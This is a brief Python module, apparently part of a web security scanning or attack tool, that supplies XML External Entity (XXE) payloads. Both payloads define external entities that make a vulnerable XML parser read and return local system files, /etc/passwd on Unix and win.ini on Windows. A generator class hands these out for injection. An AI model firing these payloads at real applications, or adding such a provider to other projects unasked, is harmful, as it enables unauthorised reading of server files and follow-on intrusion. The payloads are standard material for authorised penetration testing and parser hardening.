"""
===============================================================================
XML External Entity (XXE) Payload Provider
===============================================================================
"""

from __future__ import annotations

from typing import Iterable


XXE_PAYLOADS = (

    """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>&xxe;</root>""",

    """<?xml version="1.0"?>
<!DOCTYPE root [
<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">
]>
<root>&xxe;</root>""",

)


class XXEPayloadProvider:

    def generate(
        self,
        vector,
    ) -> Iterable[str]:

        return iter(XXE_PAYLOADS)